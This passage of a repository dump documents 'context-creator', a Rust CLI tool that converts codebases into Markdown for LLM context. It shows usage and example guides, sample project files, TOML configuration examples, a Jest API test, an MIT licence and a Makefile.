      - name: Install context-creator
        run: cargo install context-creator
      
      - name: Generate documentation
        run: |
          context-creator -d . -o docs/codebase.md --max-tokens 100000
          
      - name: Commit documentation
        run: |
          git config --local user.email "action@github.com"
          git config --local user.name "GitHub Action"
          git add docs/codebase.md
          git commit -m "Update codebase documentation" || exit 0
          git push
```

## Output Formats

### Standard Markdown

```bash
# Basic markdown output
context-creator -d project -o project.md

# With table of contents
context-creator -d project -o project.md  # TOC included by default

# File tree structure
context-creator -d project -o project.md  # Tree included by default
```

### Custom Formatting

```toml
# Custom format configuration
[format]
include_stats = true
include_tree = true
include_toc = true
group_by_type = false
sort_by_priority = true

file_header_template = "## ðŸ“ {path}"
doc_header_template = "# ðŸš€ Code context: {directory}"
```

## Performance Optimization

### Large Projects

```bash
# Use token limits for large projects
context-creator -d huge-project --max-tokens 50000 --progress

# Exclude unnecessary files
context-creator -d huge-project -c minimal-config.toml

# Process in chunks
find huge-project -type d -maxdepth 1 | xargs -I {} context-creator -d {} -o {}.md
```

### Memory Management

```bash
# For memory-constrained environments
export CODE_context_CHUNK_SIZE=1000
context-creator -d project --max-tokens 10000

# Streaming mode for very large outputs
context-creator -d project | head -n 10000 > partial.md
```

### Caching

```bash
# Enable caching (experimental)
export CODE_context_CACHE_DIR=~/.cache/context-creator
context-creator -d project -o project.md

# Clear cache
rm -rf ~/.cache/context-creator
```

## Error Handling

### Common Issues and Solutions

```bash
# Permission denied
sudo chown -R $(whoami) /path/to/project
context-creator -d /path/to/project

# Out of memory
context-creator -d project --max-tokens 10000

# LLM tool not found
which gemini  # Check if installed
export PATH="$PATH:/path/to/llm/tools"
context-creator -d project --tool gemini "prompt"

# Configuration error
context-creator --config-schema > schema.json
context-creator -c config.toml --validate-config
```

### Debugging

```bash
# Debug mode
RUST_LOG=debug context-creator -d project --verbose

# Trace execution
RUST_LOG=trace context-creator -d project 2> debug.log

# Check configuration
context-creator -c config.toml --dry-run

# Validate before processing
context-creator -d project --validate-only
```

## Tips and Best Practices

### Performance Tips

1. **Use token limits** for large projects to avoid memory issues
2. **Configure .contextignore** to exclude unnecessary files
3. **Use --progress** for long-running operations
4. **Set appropriate parallelism** with RAYON_NUM_THREADS
5. **Cache frequently accessed projects** (when available)

### Quality Tips

1. **Use descriptive prompts** for LLM integration
2. **Configure priorities** for important files
3. **Review output** before using with LLMs
4. **Use project-specific configs** for consistency
5. **Validate configurations** before deployment

### Security Tips

1. **Review .contextignore** to exclude secrets
2. **Use configuration files** to avoid command-line exposure
3. **Limit token output** for sensitive codebases
4. **Check output files** for sensitive information
5. **Use secure LLM endpoints** for private code

## Next Steps

- Check out [Configuration Reference](configuration.md) for advanced setup
- See [Examples](examples.md) for real-world use cases
- Read [API Reference](api.md) for programmatic usage
- Visit [Troubleshooting](troubleshooting.md) for common issues
```

## examples/sample-mixed-project/tests/test_api.js

Imports: supertest, index

```javascript
/**
 * API Tests
 * Testing the REST API endpoints
 */

const request = require('supertest');
const app = require('../src/index');

describe('API Endpoints', () => {
    describe('GET /', () => {
        it('should return welcome message', async () => {
            const response = await request(app).get('/');
            expect(response.status).toBe(200);
            expect(response.body).toHaveProperty('message');
            expect(response.body.message).toBe('Welcome to Sample Mixed Project');
        });
    });

    describe('GET /api/users', () => {
        it('should return list of users', async () => {
            const response = await request(app).get('/api/users');
            expect(response.status).toBe(200);
            expect(response.body).toHaveProperty('users');
            expect(Array.isArray(response.body.users)).toBe(true);
            expect(response.body.users.length).toBeGreaterThan(0);
        });

        it('should return user count', async () => {
            const response = await request(app).get('/api/users');
            expect(response.body).toHaveProperty('count');
            expect(response.body.count).toBe(response.body.users.length);
        });
    });

    describe('Error Handling', () => {
        it('should return 404 for unknown routes', async () => {
            const response = await request(app).get('/unknown-route');
            expect(response.status).toBe(404);
        });
    });
});
```

## docs/examples.md

```markdown
# Examples

Real-world examples of using context-creator for various scenarios and project types.

## Quick Start Examples

### Basic Project Analysis

```bash
# Analyze current directory
context-creator

# Analyze specific project
context-creator -d ~/projects/my-app

# Save analysis to file
context-creator -d ~/projects/my-app -o analysis.md

# Get quick overview with token limit
context-creator -d ~/projects/my-app --max-tokens 10000
```

### LLM Integration Examples

```bash
# Ask specific questions about the codebase
context-creator -d ~/projects/web-app "What does this application do?"

context-creator -d ~/projects/api "How is authentication implemented?"

context-creator -d ~/projects/ml-model "Explain the machine learning pipeline"

# Code review and analysis
context-creator -d ~/projects/feature-branch "Review this code for security issues"

context-creator -d ~/projects/legacy-app "Identify technical debt and improvement opportunities"
```

## Project Type Examples

### Rust Projects

```bash
# Rust project with Cargo
cd ~/rust-projects/web-server
context-creator -d . -o rust-analysis.md --max-tokens 50000

# Focus on core functionality
context-creator -d src/ --max-tokens 25000 "Explain the main application architecture"

# Configuration for Rust projects
cat > .context-creator.toml << EOF
[defaults]
max_tokens = 75000
progress = true

ignore = ["target/", "Cargo.lock"]

[[priorities]]
pattern = "src/main.rs"
weight = 200.0

[[priorities]]
pattern = "src/lib.rs"
weight = 180.0

[[priorities]]
pattern = "src/**/*.rs"
weight = 150.0

[[priorities]]
pattern = "Cargo.toml"
weight = 120.0
EOF
```

### JavaScript/Node.js Projects

```bash
# Node.js project analysis
cd ~/js-projects/express-api
context-creator -d . -o nodejs-analysis.md

# Focus on source code, ignore dependencies
context-creator -d src/ --max-tokens 40000

# Configuration for Node.js projects
cat > .context-creator.toml << EOF
[defaults]
max_tokens = 60000
progress = true

ignore = [
    "node_modules/",
    "dist/",
    "build/",
    "coverage/",
    "*.log"
]

[[priorities]]
pattern = "src/index.*"
weight = 200.0

[[priorities]]
pattern = "src/**/*.js"
weight = 150.0

[[priorities]]
pattern = "src/**/*.ts"
weight = 150.0

[[priorities]]
pattern = "package.json"
weight = 120.0

[[priorities]]
pattern = "*.config.js"
weight = 100.0
EOF
```

### Python Projects

```bash
# Python project analysis
cd ~/python-projects/django-app
context-creator -d . -o python-analysis.md

# Django-specific analysis
context-creator -d . "Explain the Django models and views structure"

# Configuration for Python projects
cat > .context-creator.toml << EOF
[defaults]
max_tokens = 55000
progress = true

ignore = [
    "__pycache__/",
    "*.pyc",
    "*.pyo",
    ".venv/",
    "venv/",
    ".pytest_cache/",
    "htmlcov/",
    "dist/",
    "build/",
    "*.egg-info/"
]

[[priorities]]
pattern = "main.py"
weight = 200.0

[[priorities]]
pattern = "app.py"
weight = 200.0

[[priorities]]
pattern = "manage.py"
weight = 180.0

[[priorities]]
pattern = "**/*.py"
weight = 150.0

[[priorities]]
pattern = "requirements.txt"
weight = 120.0

[[priorities]]
pattern = "setup.py"
weight = 120.0

[[priorities]]
pattern = "pyproject.toml"
weight = 120.0
EOF
```

### Go Projects

```bash
# Go project analysis
cd ~/go-projects/api-server
context-creator -d . -o go-analysis.md

# Configuration for Go projects
cat > .context-creator.toml << EOF
[defaults]
max_tokens = 50000
progress = true

ignore = [
    "vendor/",
    "bin/",
    "*.exe",
    "*.test",
    ".DS_Store"
]

[[priorities]]
pattern = "main.go"
weight = 200.0

[[priorities]]
pattern = "cmd/**/*.go"
weight = 180.0

[[priorities]]
pattern = "pkg/**/*.go"
weight = 150.0

[[priorities]]
pattern = "internal/**/*.go"
weight = 140.0

[[priorities]]
pattern = "go.mod"
weight = 120.0

[[priorities]]
pattern = "Makefile"
weight = 100.0
EOF
```

### Java Projects

```bash
# Java/Maven project
cd ~/java-projects/spring-boot-app
context-creator -d . -o java-analysis.md

# Configuration for Java projects
cat > .context-creator.toml << EOF
[defaults]
max_tokens = 65000
progress = true

ignore = [
    "target/",
    "build/",
    "*.class",
    "*.jar",
    "*.war",
    ".gradle/",
    "out/"
]

[[priorities]]
pattern = "src/main/java/**/Application.java"
weight = 200.0

[[priorities]]
pattern = "src/main/java/**/*.java"
weight = 150.0

[[priorities]]
pattern = "pom.xml"
weight = 120.0

[[priorities]]
pattern = "build.gradle"
weight = 120.0

[[priorities]]
pattern = "src/main/resources/**/*"
weight = 100.0
EOF
```

## Use Case Examples

### Code Review and Quality Analysis

```bash
# Comprehensive code review
context-creator -d feature-branch "Perform a comprehensive code review focusing on:"
context-creator -d feature-branch "1. Code quality and best practices"
context-creator -d feature-branch "2. Security vulnerabilities"
context-creator -d feature-branch "3. Performance optimization opportunities"
context-creator -d feature-branch "4. Maintainability and documentation"

# Compare with main branch
git diff main..feature-branch --name-only > changed-files.txt
context-creator -d . --include-from changed-files.txt "Review only the changed files"

# Security-focused review
cat > security-review.toml << EOF
[defaults]
max_tokens = 30000
verbose = true

ignore = ["tests/", "docs/"]

[[priorities]]
pattern = "**/auth*"
weight = 300.0

[[priorities]]
pattern = "**/security*"
weight = 300.0

[[priorities]]
pattern = "**/*login*"
weight = 250.0

[[priorities]]
pattern = "**/*password*"
weight = 250.0

[[priorities]]
pattern = "**/*token*"
weight = 200.0
EOF

context-creator -c security-review.toml -d . "Analyze this code for security vulnerabilities"
```

### Documentation Generation

```bash
# Generate API documentation
context-creator -d src/api/ "Generate comprehensive API documentation with:"
context-creator -d src/api/ "1. Endpoint descriptions"
context-creator -d src/api/ "2. Request/response schemas"
context-creator -d src/api/ "3. Authentication requirements"
context-creator -d src/api/ "4. Usage examples"

# Architecture documentation
context-creator -d . --max-tokens 40000 "Create system architecture documentation"

# Onboarding guide
context-creator -d . "Create a comprehensive onboarding guide for new developers"

# Configuration for documentation focus
cat > docs-config.toml << EOF
[defaults]
max_tokens = 50000

ignore = ["tests/", "node_modules/", "target/"]

[[priorities]]
pattern = "README.*"
weight = 300.0

[[priorities]]
pattern = "docs/**/*"
weight = 250.0

[[priorities]]
pattern = "src/**/*.md"
weight = 200.0

[[priorities]]
pattern = "*.config.*"
weight = 150.0
EOF
```

### Legacy Code Analysis

```bash
# Understand legacy codebase
context-creator -d legacy-system "Help me understand this legacy codebase:"
context-creator -d legacy-system "1. What is the main purpose and functionality?"
context-creator -d legacy-system "2. What are the key components and their relationships?"
context-creator -d legacy-system "3. What technologies and frameworks are used?"
context-creator -d legacy-system "4. What are the main pain points and technical debt?"

# Migration planning
context-creator -d old-app "Create a migration plan from this PHP application to modern Node.js"

# Refactoring opportunities
cat > refactor-analysis.toml << EOF
[defaults]
max_tokens = 45000

[[priorities]]
pattern = "**/*legacy*"
weight = 200.0

[[priorities]]
pattern = "**/*old*"
weight = 180.0

[[priorities]]
pattern = "**/*deprecated*"
weight = 160.0

[[priorities]]
pattern = "**/*.php"
weight = 150.0  # If migrating from PHP
EOF

context-creator -c refactor-analysis.toml -d . "Identify refactoring opportunities"
```

### Performance Analysis

```bash
# Performance-focused analysis
context-creator -d . "Analyze this codebase for performance bottlenecks:"
context-creator -d . "1. Identify CPU-intensive operations"
context-creator -d . "2. Find memory leaks and inefficient memory usage"
context-creator -d . "3. Detect slow database queries"
context-creator -d . "4. Suggest caching opportunities"

# Configuration for performance analysis
cat > performance-config.toml << EOF
[defaults]
max_tokens = 40000

[[priorities]]
pattern = "**/*performance*"
weight = 300.0

[[priorities]]
pattern = "**/*benchmark*"
weight = 250.0

[[priorities]]
pattern = "**/*cache*"
weight = 200.0

[[priorities]]
pattern = "**/*db*"
weight = 200.0

[[priorities]]
pattern = "**/*database*"
weight = 200.0

[[priorities]]
pattern = "**/*query*"
weight = 180.0
EOF
```

### Testing and Quality Assurance

```bash
# Test coverage analysis
context-creator -d tests/ "Analyze test coverage and suggest improvements"

# Testing strategy
context-creator -d . "Suggest a comprehensive testing strategy for this project"

# Quality metrics
cat > quality-config.toml << EOF
[defaults]
max_tokens = 35000

[[priorities]]
pattern = "tests/**/*"
weight = 200.0

[[priorities]]
pattern = "**/*test*"
weight = 180.0

[[priorities]]
pattern = "**/*spec*"
weight = 180.0

[[priorities]]
pattern = "**/test_*"
weight = 160.0

[[priorities]]
pattern = "jest.config.*"
weight = 120.0

[[priorities]]
pattern = "pytest.ini"
weight = 120.0

[[priorities]]
pattern = "Cargo.toml"
weight = 120.0  # For Rust test configuration
EOF

context-creator -c quality-config.toml -d . "Evaluate test quality and coverage"
```

## Workflow Integration Examples

### Git Hooks Integration

```bash
# Pre-commit hook
cat > .git/hooks/pre-commit << 'EOF'
#!/bin/bash
# Generate code analysis before commit

echo "Generating code analysis..."
context-creator -d . -o .git/commit-analysis.md --max-tokens 20000 --quiet

if [ $? -eq 0 ]; then
    echo "Code analysis generated successfully"
else
    echo "Failed to generate code analysis"
    exit 1
fi
EOF

chmod +x .git/hooks/pre-commit
```

### CI/CD Pipeline Integration

```yaml
# .github/workflows/code-analysis.yml
name: Code Analysis

on:
  pull_request:
    branches: [main]

jobs:
  analyze:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      
      - name: Install context-creator
        run: cargo install context-creator
      
      - name: Analyze changed files
        run: |
          # Get changed files
          git diff --name-only origin/main..HEAD > changed-files.txt
          
          # Generate analysis
          context-creator -d . --include-from changed-files.txt \
            --max-tokens 30000 -o pr-analysis.md
      
      - name: Comment on PR
        uses: actions/github-script@v6
        with:
          script: |
            const fs = require('fs');
            const analysis = fs.readFileSync('pr-analysis.md', 'utf8');
            
            github.rest.issues.createComment({
              issue_number: context.issue.number,
              owner: context.repo.owner,
              repo: context.repo.repo,
              body: `## Code Analysis\n\n${analysis}`
            });
```

### VS Code Integration

```json
// .vscode/tasks.json
{
    "version": "2.0.0",
    "tasks": [
        {
            "label": "Generate Code Analysis",
            "type": "shell",
            "command": "context-creator",
            "args": [
                "-d", "${workspaceFolder}",
                "-o", "${workspaceFolder}/docs/analysis.md",
                "--max-tokens", "50000",
                "--progress"
            ],
            "group": "build",
            "presentation": {
                "echo": true,
                "reveal": "always",
                "focus": false,
                "panel": "shared"
            },
            "problemMatcher": []
        },
        {
            "label": "Quick Code Review",
            "type": "shell",
            "command": "context-creator",
            "args": [
                "-d", "${workspaceFolder}",
                "--max-tokens", "20000",
                "Review this code for potential issues"
            ],
            "group": "build"
        }
    ]
}
```

## Advanced Configuration Examples

### Multi-Project Workspace

```toml
# ~/.config/context-creator/config.toml
[defaults]
max_tokens = 50000
progress = true

# Project-specific configurations
[projects."/workspace/frontend"]
max_tokens = 40000
tool = "gemini"
ignore = ["node_modules/", "dist/"]

[projects."/workspace/backend"]
max_tokens = 60000
tool = "codex"
ignore = ["target/", "logs/"]

[projects."/workspace/mobile"]
max_tokens = 35000
ignore = ["build/", "*.xcworkspace"]

[[priorities]]
pattern = "src/main.*"
weight = 200.0

[[priorities]]
pattern = "src/lib.*"
weight = 180.0
```

### Template Configurations

```toml
# rust-template.toml
[defaults]
max_tokens = 75000
progress = true
verbose = false

ignore = [
    "target/",
    "Cargo.lock",
    "*.rlib",
    "*.rmeta"
]

[[priorities]]
pattern = "src/main.rs"
weight = 200.0

[[priorities]]
pattern = "src/lib.rs"
weight = 180.0

[[priorities]]
pattern = "src/**/*.rs"
weight = 150.0

[[priorities]]
pattern = "Cargo.toml"
weight = 120.0

[[priorities]]
pattern = "README.*"
weight = 100.0

# Use with: context-creator -c rust-template.toml -d project/
```

```toml
# web-template.toml
[defaults]
max_tokens = 60000
progress = true

ignore = [
    "node_modules/",
    "dist/",
    "build/",
    "coverage/",
    ".next/",
    ".nuxt/",
    "*.bundle.js",
    "*.chunk.js"
]

[[priorities]]
pattern = "src/App.*"
weight = 200.0

[[priorities]]
pattern = "src/index.*"
weight = 190.0

[[priorities]]
pattern = "src/main.*"
weight = 190.0

[[priorities]]
pattern = "src/**/*.{js,ts,jsx,tsx,vue}"
weight = 150.0

[[priorities]]
pattern = "package.json"
weight = 120.0

[[priorities]]
pattern = "*.config.{js,ts}"
weight = 110.0
```

## Scripting Examples

### Batch Processing Script

```bash
#!/bin/bash
# analyze-projects.sh - Batch analyze multiple projects

PROJECTS=(
    "/workspace/project1"
    "/workspace/project2"
    "/workspace/project3"
)

OUTPUT_DIR="./analyses"
mkdir -p "$OUTPUT_DIR"

for project in "${PROJECTS[@]}"; do
    project_name=$(basename "$project")
    echo "Analyzing $project_name..."
    
    context-creator -d "$project" \
        -o "$OUTPUT_DIR/${project_name}-analysis.md" \
        --max-tokens 50000 \
        --progress
    
    echo "Analysis saved to $OUTPUT_DIR/${project_name}-analysis.md"
done

echo "All analyses complete!"
```

### Interactive Analysis Script

```bash
#!/bin/bash
# interactive-analysis.sh - Interactive code analysis

echo "Code context Interactive Analysis"
echo "================================"

read -p "Enter project directory: " PROJECT_DIR
read -p "Enter max tokens (default 50000): " MAX_TOKENS
MAX_TOKENS=${MAX_TOKENS:-50000}

read -p "Enter analysis question: " QUESTION

echo "Analyzing project..."
context-creator -d "$PROJECT_DIR" \
    --max-tokens "$MAX_TOKENS" \
    --verbose \
    "$QUESTION"
```

### Monitoring Script

```bash
#!/bin/bash
# monitor-codebase.sh - Monitor codebase changes

WATCH_DIR="$1"
OUTPUT_FILE="codebase-analysis.md"

if [ -z "$WATCH_DIR" ]; then
    echo "Usage: $0 <directory-to-watch>"
    exit 1
fi

echo "Monitoring $WATCH_DIR for changes..."

# Generate initial analysis
context-creator -d "$WATCH_DIR" -o "$OUTPUT_FILE" --max-tokens 40000

# Watch for changes
fswatch -o "$WATCH_DIR" | while read change; do
    echo "Changes detected, regenerating analysis..."
    context-creator -d "$WATCH_DIR" -o "$OUTPUT_FILE" --max-tokens 40000 --quiet
    echo "Analysis updated at $(date)"
done
```

## Next Steps

- Read the [Configuration Reference](configuration.md) for detailed options
- Check [Usage Guide](usage.md) for more command examples
- See [API Reference](api.md) for programmatic usage
- Visit [Troubleshooting](troubleshooting.md) for common issues
```

## examples/README.md

```markdown
# Code context Examples

This directory contains example projects and configuration files to demonstrate the capabilities of `context-creator`.

## Directory Structure

```
examples/
â”œâ”€â”€ sample-rust-project/    # Pure Rust project example
â”œâ”€â”€ sample-mixed-project/   # Mixed-language project (JS, Python)
â”œâ”€â”€ config-examples/        # Configuration file examples
â””â”€â”€ README.md              # This file
```

## Sample Projects

### sample-rust-project

A minimal Rust project demonstrating:
- Basic Cargo project structure
- Source files with documentation
- Test modules
- Dependencies

### sample-mixed-project

A mixed-language project showing:
- Node.js/Express backend
- Python utility scripts
- JavaScript tests
- Multiple file types and structures
- Custom `.contextignore` and `.contextkeep` files

## Configuration Examples

### minimal.toml

Shows the bare minimum configuration needed:
- Token limit setting
- Single priority rule

### comprehensive.toml

Demonstrates all available configuration options:
- Detailed priority weights
- Custom ignore patterns
- Output formatting options
- Performance tuning
- Logging configuration

## Testing the Tool

You can test `context-creator` with these examples:

```bash
# Process the Rust project
context-creator -d examples/sample-rust-project

# Process with token limit
context-creator -d examples/sample-mixed-project --max-tokens 10000

# Use custom configuration
context-creator -d examples/sample-mixed-project -c examples/config-examples/comprehensive.toml

# Save output to file
context-creator -d examples/sample-rust-project -o rust-project.md
```

## Creating Your Own Examples

To add new examples:

1. Create a new directory under `examples/`
2. Add relevant source files
3. Include `.contextignore` for exclusions
4. Include `.contextkeep` for priorities
5. Add a README explaining the example

## Tips for Testing

1. **Token Limits**: Test with various `--max-tokens` values to see prioritization in action
2. **File Types**: Include diverse file extensions to test language detection
3. **Large Files**: Add some larger files to test performance and chunking
4. **Binary Files**: Include some binary files to test detection and skipping
5. **Symbolic Links**: Create symlinks to test handling (if supported by your OS)
```

## examples/sample-mixed-project/docs/README.md

```markdown
# Sample Mixed Project

This is a sample project demonstrating a mixed-language codebase for testing `context-creator`.

## Features

- Node.js/Express backend
- Python utility scripts
- JavaScript tests
- Multiple configuration files

## Project Structure

```
sample-mixed-project/
â”œâ”€â”€ src/
â”‚   â”œâ”€â”€ index.js      # Main application entry
â”‚   â””â”€â”€ utils.py      # Python utilities
â”œâ”€â”€ tests/
â”‚   â””â”€â”€ test_api.js   # API tests
â”œâ”€â”€ docs/
â”‚   â””â”€â”€ README.md     # This file
â””â”€â”€ package.json      # Node.js dependencies
```

## Running the Project

```bash
# Install dependencies
npm install

# Start the server
npm start

# Run tests
npm test
```

## API Endpoints

- `GET /` - Welcome message
- `GET /api/users` - List all users

## Python Utilities

The `utils.py` file provides data processing capabilities that can be called from the Node.js application or used standalone.
```

## test_no_git/test_no_git_dir/Cargo.toml

```toml
[package]
name = "test_no_git"
version = "0.1.0"
edition = "2024"

[dependencies]

[[bin]]
name = "test_no_git"
path = "main.rs"
```

## examples/config-examples/comprehensive.toml

```toml
# Comprehensive configuration example
# Shows all available options

[defaults]
max_tokens = 200000
progress = true
verbose = true
quiet = false

[ignore]
patterns = [
    "*.log",
    "*.tmp",
    "*.cache",
    ".git/",
    "vendor/",
    "node_modules/",
    "target/debug/",
]
use_gitignore = true

# Detailed priority configuration
[[priorities]]
pattern = "src/main.rs"
weight = 150  # Entry point gets highest priority

[[priorities]]
pattern = "src/lib.rs"
weight = 140

[[priorities]]
pattern = "src/api/**/*.rs"
weight = 120  # API definitions are important

[[priorities]]
pattern = "src/core/**/*.rs"
weight = 110

[[priorities]]
pattern = "src/**/*.rs"
weight = 100  # Other source files

[[priorities]]
pattern = "Cargo.toml"
weight = 90

[[priorities]]
pattern = "**/*.md"
weight = 70

[[priorities]]
pattern = "tests/**/*.rs"
weight = 50  # Tests are lower priority

[[priorities]]
pattern = "benches/**/*.rs"
weight = 40

[[priorities]]
pattern = "examples/**/*"
weight = 30  # Examples are lowest priority

[output]
include_tree = true
syntax_highlighting = true
max_line_length = 120  # Wrap long lines
file_header_template = """
================================================================================
## File: {path}
================================================================================
"""

[performance]
threads = 8  # Use 8 threads
max_file_size = 5242880  # 5MB limit per file
chunk_size = 131072  # 128KB chunks

[tokenizer]
model = "cl100k_base"  # GPT-3.5/4 tokenizer
cache_enabled = true

[logging]
level = "debug"  # trace, debug, info, warn, error
file = "context-creator.log"
stderr = true
```

## examples/config-examples/minimal.toml

```toml
# Minimal configuration example
# Only specify what differs from defaults

[defaults]
max_tokens = 50000

[[priorities]]
pattern = "src/**/*.rs"
weight = 100
```

## examples/sample-mixed-project/package.json

```json
{
  "name": "sample-mixed-project",
  "version": "1.0.0",
  "description": "A sample mixed-language project for testing context-creator",
  "main": "src/index.js",
  "scripts": {
    "start": "node src/index.js",
    "test": "jest",
    "build": "webpack",
    "dev": "nodemon src/index.js"
  },
  "dependencies": {
    "express": "^4.18.0",
    "axios": "^1.0.0",
    "dotenv": "^16.0.0"
  },
  "devDependencies": {
    "jest": "^29.0.0",
    "nodemon": "^2.0.0",
    "webpack": "^5.0.0"
  }
}
```

## examples/sample-rust-project/Cargo.toml

```toml
[package]
name = "sample-rust-project"
version = "0.1.0"
edition = "2021"

[dependencies]
serde = { version = "1.0", features = ["derive"] }
tokio = { version = "1.0", features = ["full"] }
reqwest = "0.11"
```

## LICENSE

```text
MIT License

Copyright (c) 2025 Mati

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
```

## Makefile

```text
# Makefile for the context-creator Rust project

# Use cargo-first approach for toolchain consistency and versioning.
CARGO := cargo

# Set the default goal to 'help' for better user experience.
.DEFAULT_GOAL := help

# Phony targets ensure these commands run even if a file with the same name exists.
.PHONY: help build release check test doc fmt fmt-check lint validate clean bench run-example install dev

# ====================================================================================
# Main Targets
# ====================================================================================

build: validate ## Build the project in debug mode (runs all validations first).
	$(CARGO) build

release: validate ## Build the project in release mode for production (runs all validations first).
	$(CARGO) build --release

test: fmt-check lint ## Run all tests (runs format and lint checks first).
	$(CARGO) test --all-targets

run-example: ## Run the tool with example usage.
	$(CARGO) run -- --help

install: ## Install the tool locally.
	$(CARGO) install --path .

dev: ## Run in development mode with example arguments.
	$(CARGO) run -- examples/sample-project

# ====================================================================================
# Quality & CI
# ====================================================================================

check: ## Check the project for errors quickly, without building.
	$(CARGO) check --all-targets

fmt: ## Format the code using rustfmt.
	$(CARGO) fmt

fmt-check: ## Check if the code is correctly formatted.
	$(CARGO) fmt -- --check

lint: ## Lint the code with clippy.
	$(CARGO) clippy --all-targets --all-features -- -D warnings

validate: fmt-check lint ## Run all validation checks (format, lint). Ideal for pre-build.
	@echo "âœ… Code quality validation successful."

# ====================================================================================
# Project Utilities
# ====================================================================================

clean: ## Remove build artifacts from the target directory.
	$(CARGO) clean

doc: ## Generate and open project documentation in the browser.
	$(CARGO) doc --open

bench: ## Run benchmarks.
	$(CARGO) bench

update: ## Update dependencies to their latest versions.
	$(CARGO) update

audit: ## Check for security vulnerabilities in dependencies.
	$(CARGO) audit

# ====================================================================================
# Development Helpers
# ====================================================================================

watch: ## Watch for changes and recompile (requires cargo-watch).
	cargo watch -x build

watch-test: ## Watch for changes and run tests (requires cargo-watch).
	cargo watch -x test

coverage: ## Generate test coverage report (requires cargo-tarpaulin).
	cargo tarpaulin --out Html

# ====================================================================================
# Help
# ====================================================================================

help: ## Display this help message.
	@echo "context-creator - High-performance CLI tool to convert codebases to Markdown for LLM context"
	@echo ""
	@echo "Usage: make [target]"
	@echo ""
	@echo "Available targets:"
	@awk 'BEGIN {FS = ":.*?## "} /^[a-zA-Z_0-9-]+:.*?## / {printf "  \033[36m%-20s\033[0m %s\n", $$1, $$2}' $(MAKEFILE_LIST) | sort
```

